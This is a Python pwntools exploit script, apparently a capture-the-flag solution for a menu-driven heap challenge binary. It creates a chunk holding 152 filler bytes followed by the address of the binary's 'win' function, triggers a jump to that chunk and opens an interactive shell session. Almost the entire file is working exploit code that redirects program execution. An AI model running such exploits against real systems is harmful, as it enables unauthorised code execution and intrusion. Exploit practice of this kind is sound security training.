#! /usr/bin/python
from pwn import *

context.update(
        arch="amd64",
        endian="little",
        log_level="debug",
        os="linux",
        #terminal=["tmux", "split-window", "-h", "-p 65"]
        terminal=["st"]
)
to = 2

ru = lambda p,s: p.recvuntil(s, timeout=to)
rl = lambda p: p.recvline()
sla = lambda p,a,b: p.sendlineafter(a, b, timeout=to)
sl = lambda p,a: p.sendline(a)

def start(binary):

    gs = '''
        set context-sections stack regs disasm
        set show-compact-regs on
        set resolve-heap-via-heuristic on
        b main
    '''

    if args.GDB:
        return gdb.debug(binary, gdbscript=gs)
    elif args.REMOTE:
        return remote()
    else:
        return process(binary)

def create(p, size, value):
    ru(p, "[1-5] :")
    sl(p,b"1")
    ru(p,b"size :")
    sl(p,b"%i" % size)
    ru(p,b"data :")
    sl(p,value)

def delete(p, index):
    ru(p,b"[1-5] :")
    sl(p,b"2")

def allocate(p):
    ru(p,b"[1-5] :")
    sl(p,b"4")

def jump(p, index):
    ru(p,b"[1-5] :")
    sl(p,b"5")
    ru(p,b"or 3)")
    sl(p,"%i" % index)
    
def exploit(p,e):
    
    payload = b"A" * 152 + p64(e.sym["win"])
    create(p, 0x80, payload)
    allocate(p)
    jump(p,2)

    p.interactive()
    
if __name__=="__main__":
    file = args.BIN

    p = start(file)
    e = context.binary = ELF(file)

    exploit(p,e)
